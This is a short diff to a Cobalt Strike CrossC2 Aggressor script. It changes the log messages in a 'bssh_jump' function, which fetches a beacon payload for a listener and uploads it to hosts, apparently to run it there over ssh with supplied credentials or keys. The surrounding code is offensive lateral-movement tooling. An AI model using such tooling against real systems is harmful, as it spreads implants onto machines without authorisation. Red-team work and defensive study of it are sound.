@@ -86,12 +86,12 @@ sub bssh_jump {
     $ObjectPath = $savepath.'/'.$savename;
 
 
-    btask($bid, "------ sshpass ------");
+    btask($bid, "[bssh_jump]: ------ sshpass ------");
     $beaconData = getCrossC2Beacon($listener, "main");
     if (strlen($beaconData) > 0) {
         bawait_upload_raw($bid, $beaconData, $savepath, $savename, &bssh_jump_cb, @($username, $password, $privatekey, $passtype, $hostArray, $ObjectPath));
     } else { 
-        berror($bid, "maybe no beacondata in CrossC2Listener");
+        berror($bid, "[bssh_jump]: maybe no beacondata in CrossC2Listener: $listener");
     }
 }
 # reverse_https -> scp upload & ssh run
